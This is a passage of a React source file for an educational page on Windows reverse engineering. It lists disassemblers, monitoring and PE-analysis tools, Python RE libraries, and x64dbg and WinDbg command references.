                        <Box sx={{ display: "flex", gap: 1 }}>
                          <Chip label={tool.cat} size="small" color="primary" variant="outlined" />
                          <Chip label={tool.price} size="small" color={tool.price === "Free" ? "success" : "default"} />
                        </Box>
                      </Box>
                      <Typography variant="body2" paragraph>{tool.desc}</Typography>
                      <Typography variant="caption" color="text.secondary">{tool.features}</Typography>
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>

            <Typography variant="h6" gutterBottom fontWeight="bold">Disassemblers & Decompilers</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "Ghidra", cat: "Disasm/Decomp", desc: "NSA's free RE framework. Excellent decompiler, scripting, collaboration.", url: "ghidra-sre.org", features: "Decompiler, Python/Java scripting, multi-arch", price: "Free" },
                { name: "IDA Pro", cat: "Disasm/Decomp", desc: "Industry standard. Best analysis, huge plugin ecosystem. Hex-Rays decompiler.", url: "hex-rays.com", features: "FLIRT signatures, IDAPython, plugins", price: "$$$" },
                { name: "IDA Free", cat: "Disasm", desc: "Free version of IDA. x86/x64 only, no decompiler, cloud-based.", url: "hex-rays.com", features: "Basic disassembly, limited features", price: "Free" },
                { name: "Binary Ninja", cat: "Disasm/Decomp", desc: "Modern RE platform with clean UI. Good API, IL-based analysis.", url: "binary.ninja", features: "BNIL, Python API, plugins", price: "$$" },
                { name: "Cutter", cat: "Disasm/Decomp", desc: "Free RE platform based on Rizin (radare2 fork). GUI + scripting.", url: "cutter.re", features: "Ghidra decompiler plugin, graphs", price: "Free" },
                { name: "radare2/rizin", cat: "Disasm", desc: "Command-line RE framework. Powerful but steep learning curve.", url: "rada.re", features: "Scripting, forensics, multi-arch", price: "Free" },
              ].map((tool) => (
                <Grid item xs={12} md={6} lg={4} key={tool.name}>
                  <Card variant="outlined">
                    <CardContent>
                      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                        <Typography variant="subtitle1" fontWeight="bold">{tool.name}</Typography>
                        <Chip label={tool.price} size="small" color={tool.price === "Free" ? "success" : tool.price === "$$" ? "warning" : "error"} />
                      </Box>
                      <Typography variant="body2" paragraph>{tool.desc}</Typography>
                      <Typography variant="caption" color="text.secondary">{tool.features}</Typography>
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>

            <Typography variant="h6" gutterBottom fontWeight="bold">Monitoring & Analysis</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "Process Monitor", cat: "Monitor", desc: "Real-time file system, registry, process/thread activity. Essential for behavioral analysis.", url: "Sysinternals" },
                { name: "Process Hacker", cat: "Monitor", desc: "Advanced process viewer. Memory editor, handle viewer, network connections.", url: "processhacker.sf.io" },
                { name: "Process Explorer", cat: "Monitor", desc: "Enhanced Task Manager. DLL listing, handle search, VirusTotal integration.", url: "Sysinternals" },
                { name: "API Monitor", cat: "Monitor", desc: "Monitor and control API calls made by applications. Filter by module/function.", url: "rohitab.com" },
                { name: "Autoruns", cat: "Persistence", desc: "Shows all auto-starting programs. Essential for finding persistence mechanisms.", url: "Sysinternals" },
                { name: "Regshot", cat: "Diff", desc: "Registry snapshot comparison. Before/after analysis of installer behavior.", url: "sourceforge.net" },
                { name: "Wireshark", cat: "Network", desc: "Network protocol analyzer. Capture and analyze malware C2 traffic.", url: "wireshark.org" },
                { name: "Fiddler", cat: "Network", desc: "HTTP/HTTPS debugging proxy. Intercept and modify web traffic.", url: "telerik.com" },
              ].map((tool) => (
                <Grid item xs={12} sm={6} md={4} lg={3} key={tool.name}>
                  <Card variant="outlined">
                    <CardContent>
                      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                        <Typography variant="subtitle2" fontWeight="bold">{tool.name}</Typography>
                        <Chip label={tool.cat} size="small" variant="outlined" />
                      </Box>
                      <Typography variant="body2" color="text.secondary">{tool.desc}</Typography>
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>

            <Typography variant="h6" gutterBottom fontWeight="bold">PE Analysis & Utilities</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "PE-bear", desc: "PE file viewer/editor. Section viewer, imports/exports, hex editing.", url: "github.com/hasherezade" },
                { name: "CFF Explorer", desc: "PE editor with resource viewer, dependency walker, hex editing.", url: "ntcore.com" },
                { name: "Detect It Easy (DIE)", desc: "Packer/compiler/protector detection. Signature-based identification.", url: "github.com/horsicq" },
                { name: "PEiD", desc: "Classic packer identifier. Large signature database.", url: "Legacy tool" },
                { name: "pestudio", desc: "Static malware assessment. Indicators, VirusTotal, strings.", url: "winitor.com" },
                { name: "FLOSS", desc: "Extract obfuscated strings from malware. Stack strings, decoded strings.", url: "github.com/mandiant" },
                { name: "Resource Hacker", desc: "View, modify, add, delete, and extract resources in executables.", url: "angusj.com" },
                { name: "UPX", desc: "Executable packer/unpacker. Common packer, easy to unpack.", url: "upx.github.io" },
              ].map((tool) => (
                <Grid item xs={12} sm={6} md={4} lg={3} key={tool.name}>
                  <Card variant="outlined">
                    <CardContent>
                      <Typography variant="subtitle2" fontWeight="bold">{tool.name}</Typography>
                      <Typography variant="body2" color="text.secondary">{tool.desc}</Typography>
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>

            <Typography variant="h6" gutterBottom fontWeight="bold">Python Libraries for RE</Typography>
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Essential Python Packages</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="pip install these packages">{`# PE file parsing
pip install pefile lief

# Disassembly
pip install capstone  # Multi-arch disassembler
pip install keystone-engine  # Assembler

# Emulation
pip install unicorn  # CPU emulator
pip install qiling  # Higher-level emulation framework

# Binary analysis
pip install angr  # Symbolic execution
pip install miasm  # RE framework with emulation

# Deobfuscation / Unpacking
pip install uncompyle6  # Python bytecode decompiler
pip install pyinstxtractor  # PyInstaller extractor

# Network
pip install scapy  # Packet manipulation
pip install dpkt  # PCAP parsing

# Example: Parse PE with pefile
import pefile
pe = pefile.PE("malware.exe")
print(f"Entry Point: {hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)}")
print(f"Image Base: {hex(pe.OPTIONAL_HEADER.ImageBase)}")
for section in pe.sections:
    print(f"Section: {section.Name.decode().rstrip('\\x00')}")`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">x64dbg Essential Shortcuts</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.1) }}>
                        <TableCell><strong>Shortcut</strong></TableCell>
                        <TableCell><strong>Action</strong></TableCell>
                        <TableCell><strong>Shortcut</strong></TableCell>
                        <TableCell><strong>Action</strong></TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      <TableRow><TableCell><code>F2</code></TableCell><TableCell>Toggle breakpoint</TableCell><TableCell><code>F7</code></TableCell><TableCell>Step into</TableCell></TableRow>
                      <TableRow><TableCell><code>F8</code></TableCell><TableCell>Step over</TableCell><TableCell><code>F9</code></TableCell><TableCell>Run</TableCell></TableRow>
                      <TableRow><TableCell><code>Ctrl+F9</code></TableCell><TableCell>Execute till return</TableCell><TableCell><code>Ctrl+G</code></TableCell><TableCell>Go to address</TableCell></TableRow>
                      <TableRow><TableCell><code>Ctrl+B</code></TableCell><TableCell>Binary search</TableCell><TableCell><code>Ctrl+F</code></TableCell><TableCell>Find pattern</TableCell></TableRow>
                      <TableRow><TableCell><code>Space</code></TableCell><TableCell>Assemble instruction</TableCell><TableCell><code>;</code></TableCell><TableCell>Add comment</TableCell></TableRow>
                      <TableRow><TableCell><code>N</code></TableCell><TableCell>Set label</TableCell><TableCell><code>Ctrl+A</code></TableCell><TableCell>Analyze module</TableCell></TableRow>
                    </TableBody>
                  </Table>
                </TableContainer>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">WinDbg Essential Commands</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="Common WinDbg Commands">{`# Execution
g                    # Go (run)
p                    # Step over
t                    # Step into (trace)
gu                   # Go up (execute until return)
.restart             # Restart debugging session

# Breakpoints
bp <address>         # Set breakpoint
bp kernel32!CreateFileW  # Break on API
bl                   # List breakpoints
bc *                 # Clear all breakpoints
ba r4 <address>      # Hardware breakpoint (read, 4 bytes)

# Memory
db <address>         # Display bytes
dd <address>         # Display DWORDs
dq <address>         # Display QWORDs
da <address>         # Display ASCII string
du <address>         # Display Unicode string
!address             # Show memory layout

# Disassembly
u <address>          # Unassemble (disassemble)
uf <function>        # Unassemble function
ub <address>         # Unassemble backwards

# Registers & Stack
r                    # Display registers
r eax=0              # Set register value
k                    # Display call stack
kv                   # Verbose stack (params)

# Modules
lm                   # List modules
!lmi <module>        # Module info
x kernel32!*File*    # Search symbols

# PEB/TEB
!peb                 # Display PEB
!teb                 # Display TEB
dt ntdll!_PEB       # Dump PEB structure
dt ntdll!_TEB       # Dump TEB structure

# Analyze crash
!analyze -v          # Verbose crash analysis`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
              </Paper>
            </Box>

            {/* Section: Quiz */}
            <Box id="quiz" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <QuizSection />
            </Box>

            {/* Back to Learning Hub Button */}
            <Box sx={{ display: "flex", justifyContent: "center", mt: 6 }}>
              <Button
                variant="contained"
                size="large"
                startIcon={<ArrowBackIcon />}
                onClick={() => navigate("/learn")}
                sx={{
                  px: 4,
                  py: 1.5,
                  borderRadius: 3,
                  fontWeight: 700,
                  background: `linear-gradient(135deg, ${accent}, #8b5cf6)`,
                  "&:hover": {
                    background: `linear-gradient(135deg, #2563eb, #7c3aed)`,
                  },
                }}
              >
                Back to Learning Hub
              </Button>
            </Box>
          </Box>
        </Box>
    </LearnPageLayout>
  );
};

export default WindowsInternalsREPage;
